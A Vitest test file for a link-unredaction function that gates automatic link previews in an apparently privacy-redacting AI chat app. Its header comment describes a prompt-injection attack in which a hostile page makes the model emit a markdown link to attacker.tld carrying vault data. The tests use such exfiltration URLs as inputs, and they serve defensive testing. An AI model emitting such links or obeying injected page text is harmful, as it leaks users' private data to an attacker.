import { describe, it, expect } from "vitest";
import { realLinkHref } from "./linkHref";

/**
 * The exfil property `MarkdownLink` relies on to decide whether a link may be
 * AUTO-previewed: "did un-redacting this href change it?" — i.e. did it carry a
 * vault value?
 *
 * The attack it closes: the model only ever holds FAKES, so a prompt-injected page
 * can make it emit `[voir](https://attacker.tld/?d=<fake>)`. `realLinkHref` restores
 * the fake to the REAL value (correct — a click must reach the right page), and the
 * preview fetch would then GET that URL automatically, handing the real value to an
 * attacker-chosen host with no user action. A fake→real oracle over the whole vault.
 */
const vault = { "Sarah Savel": "Léa Morvan", "Norvik Group": "Karl Studio" };

describe("a link href that carries a vault value is detectable (auto-preview gate)", () => {
  it("DETECTS the exfil shape: a fake in the query string resolves to the real value", () => {
    const raw = "https://attacker.tld/?d=Sarah%20Savel";
    const real = realLinkHref(raw, vault)!;
    expect(real).not.toBe(raw); // changed ⇒ it carried vault data ⇒ never auto-fetched
    // The real value goes back PERCENT-ENCODED (`L%C3%A9a%20Morvan`) — which leaks
    // exactly as well, since the receiving server decodes it. Assert on the decoded
    // form so the test names what a GET would actually have handed the attacker.
    expect(decodeURIComponent(real)).toContain("Léa Morvan");
  });

  it("DETECTS it for the `+`-encoded form too", () => {
    const raw = "https://attacker.tld/?d=Norvik+Group";
    expect(realLinkHref(raw, vault)).not.toBe(raw);
  });

  it("DETECTS a fake in the PATH, not just the query", () => {
    const raw = "https://attacker.tld/Sarah%20Savel/profile";
    expect(realLinkHref(raw, vault)).not.toBe(raw);
  });

  // The other side: an ordinary link must still preview, or the gate would kill the
  // feature rather than the attack.
  it("leaves an ordinary link untouched, so it still previews", () => {
    const raw = "https://lemonde.fr/article/123";
    expect(realLinkHref(raw, vault)).toBe(raw);
  });

  it("an empty vault never changes an href (nothing to leak, nothing to gate)", () => {
    const raw = "https://attacker.tld/?d=Sarah%20Savel";
    expect(realLinkHref(raw, {})).toBe(raw);
    expect(realLinkHref(raw, undefined)).toBe(raw);
  });
});
